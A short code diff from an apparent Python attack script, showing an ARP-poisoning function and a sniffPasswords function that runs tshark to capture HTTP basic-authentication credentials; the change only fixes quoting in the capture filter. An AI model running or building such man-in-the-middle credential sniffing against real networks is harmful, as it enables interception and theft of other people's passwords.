@@ -42,7 +42,7 @@ def arpPoison(interface_name, host):
     return arpSpoofProc
 
 def sniffPasswords():
-    return subprocess.Popen(["tshark", "-ni", INTERFACE_NAME, "-T", "fields", "-e", "http.authbasic", "-Y", '"http.authbasic"'])
+    return subprocess.Popen(["tshark", "-ni", INTERFACE_NAME, "-T", "fields", "-e", "http.authbasic", "-Y", 'http.authbasic'])
 
 if __name__ == "__main__":
     setup()
